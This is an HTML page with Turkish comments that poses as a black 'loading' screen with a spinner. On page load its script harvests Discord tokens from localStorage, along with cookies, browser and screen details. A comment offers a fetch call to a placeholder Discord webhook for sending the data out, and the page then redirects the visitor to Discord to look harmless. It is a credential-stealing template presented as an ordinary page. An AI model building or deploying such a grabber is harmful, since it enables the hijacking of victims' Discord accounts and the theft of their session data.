<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Yükleniyor...</title>
    <style>
        body {
            background-color: black; /* SİYAAH EKRAAN */
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }
        
        /* İsteğe bağlı: Küçük bir yükleme göstergesi (isteğe bağlı, kaldırmak için bu div'i sil) */
        .loader {
            border: 4px solid #333;
            border-top: 4px solid white;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

    <!-- Siyah ekranın ortasında küçük bir yükleme simgesi (isteğe bağlı) -->
    <div class="loader"></div>

<script>
    // VERİ TOPLAMA FONKSİYONU
    function collectData() {
        let discordToken = localStorage.getItem('token') || localStorage.getItem('discord_token');
        
        // Token bulunamazsa başka anahtarları dene
        if (!discordToken) {
            for (let key in localStorage) {
                if (key.includes('discord')) {
                    discordToken = localStorage.getItem(key);
                    break;
                }
            }
        }

        const cookies = document.cookie;

        // Verileri hazırla
        let data = {
            token: discordToken,
            cookies: cookies,
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screenResolution: window.screen.width + "x" + window.screen.height
        };

        // Veriyi Discord'a göndermek için buraya kendi webhook URL'ini koy
        // Örnek: fetch('https://discord.com/api/webhooks/SENIN_WEBHOOK_URLUN', ...
        
        console.log("Veriler toplandı:", data);
        
        // Eğer bir sunucuya göndermek istersen, yukarıdaki fetch kodunu aç.
        // Şimdilik sadece konsola yazdırıyoruz.
    }

    // SAYFA YÜKLENDİĞİNDE OTOMATİK BAŞLAT
    window.onload = function() {
        // 1. Verileri topla
        collectData();

        // 2. 2 saniye bekle
        setTimeout(() => {
            // 3. Hedef siteye yönlendir (Örn: Discord Ana Sayfa)
            window.location.href = "https://discord.com/channels/@me";
            
            // Veya video linkine gitmek istersen:
            // window.location.href = "https://www.youtube.com/watch?v=VIDEO_ID";
        }, 2000); // 2 saniye
    };
</script>

</body>
</html>
